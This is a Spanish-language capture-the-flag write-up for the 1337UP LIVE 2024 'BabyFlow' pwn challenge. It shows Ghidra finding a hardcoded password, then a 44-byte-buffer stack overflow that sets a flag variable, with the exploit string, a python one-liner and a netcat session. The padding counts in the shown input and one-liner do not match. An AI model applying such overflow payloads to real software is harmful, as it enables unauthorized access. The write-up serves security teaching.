---
title: "BabyFlow - 1337UP LIVE CTF"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "pie", "ghidra", "lsb", "babyflow", "stack", "1337up-live-ctf", "ctf-writeup"]
summary: "BabyFlow - 1337UP LIVE CTF2024"
source:
  name: "CTFtime writeup #39658"
  url: "https://ctftime.org/writeup/39658"
original_source: "https://k3sero.github.io/posts/Babyflow-1337UpCTF2024/"
ctf:
  name: "1337UP LIVE CTF"
  challenge: "BabyFlow"
---

## Metadata

- **CTF:** 1337UP LIVE CTF
- **Task:** BabyFlow
- **Author team:** Caliphal Hounds
- **CTFtime:** <https://ctftime.org/writeup/39658>
- **Original writeup:** <https://k3sero.github.io/posts/Babyflow-1337UpCTF2024/>

---
BabyFlow - 1337UP LIVE CTF2024 __

Contenido __

BabyFlow - 1337UP LIVE CTF2024

__

Autor del reto: `CryptoCat`

Dificultad: Fácil

## Enunciado __

“Does this login application even work?!

##  Archivos __

Este reto nos da los siguientes archivos.

  * `babyflow` : Contiene el ejecutable a vulnerar.
  * `nc babyflow.ctf.intigriti.io 1331` : Conexión por netcat al servidor del reto.


Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2024/Pwn/1337UpCTF2024/BabyFlow).

## Analizando el código __

En este reto, tenemos un ejecutable el cual se corresponde con un`ELF` (Executable and Linkable Format) de 64 bits LSB.

____

`

```
    1
    2
    3
    4
```

| 

```
    ┌──(kesero㉿kali)-[~]
    └─$ file babyflow
    
    babyflow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=55a6fe0ff25ff287549a03eb79dd00df541ece7f, for GNU/Linux 3.2.0, not stripped
```  
  
---|---  
`

Para poder ejecutarlo, simplemente le otorgamos permisos de ejecución y observamos lo siguiente.

____

`

```
    1
    2
    3
    4
    5
```

| 

```
    ┌──(kesero㉿kali)-[~]
    └─$ ./babyflow
    
    Enter password: password
    Inorrect Password!
```  
  
---|---  
`

## Solución __

En este reto, tenemos que encontrar una contraseña para poder continuar con la ejecución del programa. Lo primero que deberemos de hacer será lanzar un`strings` al binario para que nos arroje las cadenas de texto contenidas en dicho ejecutable. En este caso no encontramos nada.

Lo siguiente a probar será la herramienta de `Ghidra` con la cual podremos analizar el código de manera estática para observar el funcionamiento y el comportamiento del programa.

Para ello inicializamos `Ghidra`, creamos un proyecto, importamos el ejecutable y por último, le damos a analizar, para que el programa nos arroje el código en ensamblador analizado.

Una vez ya tenemos el entorno creado, tenemos que irnos a la sección de funciones e ir analizando las mismas en busca de cualquier información. En este caso, solo tenemos una función `main`. Tras cambiar el nombre de algunas variables en la función `main`, podemos observar su comportamiento de forma más clara y a su vez, podemos ver que la contraseña esta hardcodeada en texto claro.

[![codigo_ghidra](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2024/Pwn/1337UpCTF2024/BabyFlow/function.png)](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2024/Pwn/1337UpCTF2024/BabyFlow/function.png)

Como podemos ver, la contraseña a introducir para continuar con la ejecución del programa es `SuPeRsEcUrEPaSsWoRd123`, por lo que ejecutando nuevamente el binario con esta contraseña obtenemos lo siguiente.

____

`

```
    1
    2
    3
    4
    5
```

| 

```
    ┌──(kesero㉿kali)-[~]
    └─$ ./babyflow
    Enter password: SuPeRsEcUrEPaSsWoRd123
    Correct Password!
    Are you sure you are admin? o.O
```  
  
---|---  
`

Para poder llegar a la ejecución del `print` con la flag, tenemos que introducir la contraseña primero y posteriormente entrar dentro del `if`, el cual tiene asociado una variable `local_c`. Si `local_c` es igual a `1`, entonces se ejecutará el contenido.

Por tanto, simplemente con cambiar el valor de `local_c` a `1`, una vez hayamos introducido la contraseña correcta, ya podremos acceder a la ejecución del `print` y obtener la flag, ¿cierto?

Solo hay un pequeño problema y es que en el código del ejecutable no se cambia el valor de `local_c`, por lo que el valor de dicha variable permanece igual en su ejecución y su contenido siempre es `0`.

Llegados a este punto, tenemos que cambiar el valor de dicha variable de manera dinámica, es decir, una vez el programa está en ejecucción. Pero realmente, ¿cómo hacemos esto?

Para conseguir cambiar el valor de la variable `local_c`, tenemos que usar técnicas como **explotación de memoria** o **manipulación de variables en el binario**.

Vamos a comenzar a realizar un sencillo `Buffer Overflow` ya que podemos observar que la función `fgets` permite leer hasta 50 caracteres (`0x32` en hexadecimal). Sin embargo, el buffer `input` tiene 44 bytes. Esto deja una brecha de 6 bytes a aprovechar para sobreescribir `local_c`. Por lo tanto, tendremos que estructurar un input de manera que la parte adicional después del string correcto, sobreescriba `local_c` en memoria.

Es muy importante aclarar que la variable `local_c` está declarada en memoria inmediatamente después del buffer input. Esto significa que cualquier contenido adicional que sobrepase los 44 bytes del buffer de entrada puede escribir directamente sobre la variable `local_c`.

Por ejemplo un buen input sería el siguiente:

____

`

```
    1
```

| 

```
    SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAA\x01
```  
  
---|---  
`

### NOTA __

Para ir probando inputs, lo recomendable es utilizar la consola interactiva de`python` e ir calculando la cantidad necesaria para desbordar el buffer y cambiar el contenido de la variable `local_c`.

____

`

```
    1
```

| 

```
     python -c 'print("SuPeRsEcUrEPaSsWoRd123" + "A" * 29 + "\x01")' | ./babyflow
```  
  
---|---  
`

En este caso:

  * `SuPeRsEcUrEPaSsWoRd123` satisface la comparación de contraseña.
  * `AAAAAAAAAAAAAAAAAAAA\x01` desbordará el buffer y sobrescribe `local_c` con el valor `0x01`, que se corresponde con el valor `1`.


Al ejecutar el binario, obtenemos lo siguiente.

____

`

```
    1
    2
    3
    4
    5
    6
```

| 

```
    ┌──(kesero㉿kali)-[~]
    └─$ ./babyflow
    
    Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAA\x01
    Correct Password!
    INTIGRITI{the_flag_is_different_on_remote}
```  
  
---|---  
`

Listo! Una vez tenemos la flag en local, simplemente tenemos que obtenerla de manera remota. Para esto, como este reto requiere de introducir la cadena correcta, no es necesario realizar un script para automatizar el proceso, únicamente con introducir dicha cadena en el servidor, ya obtenemos la flag.

____

`

```
    1
    2
    3
    4
    5
    6
```

| 

```
    ┌──(kesero㉿kali)-[~]
    └─$ nc babyflow.ctf.intigriti.io 1331a
    
    Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAA\x01
    Correct Password!
    INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
```  
  
---|---  
`

## Flag __

`INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}`

__[Writeups Competiciones Internacionales](https://k3sero.github.io/categories/writeups-competiciones-internacionales/), [Pwn](https://k3sero.github.io/categories/pwn/)

__[Pwn](https://k3sero.github.io/tags/pwn/) [Pwn - Buffer Overflow](https://k3sero.github.io/tags/pwn-buffer-overflow/) [Dificultad - Fácil](https://k3sero.github.io/tags/dificultad-f%C3%A1cil/) [Otros - Writeups](https://k3sero.github.io/tags/otros-writeups/) [337UPLIVECTF](https://k3sero.github.io/tags/337uplivectf/)

Esta entrada está licenciada bajo [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) por el autor.

Compartir [ __](https://twitter.com/intent/tweet?text=BabyFlow%20-%201337UP%20LIVE%20CTF2024%20-%20Kesero&url=https%3A%2F%2Fk3sero.github.io%2Fposts%2FBabyflow-1337UpCTF2024%2F "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?title=BabyFlow%20-%201337UP%20LIVE%20CTF2024%20-%20Kesero&u=https%3A%2F%2Fk3sero.github.io%2Fposts%2FBabyflow-1337UpCTF2024%2F "Facebook") [ __](https://t.me/share/url?url=https%3A%2F%2Fk3sero.github.io%2Fposts%2FBabyflow-1337UpCTF2024%2F&text=BabyFlow%20-%201337UP%20LIVE%20CTF2024%20-%20Kesero "Telegram") __
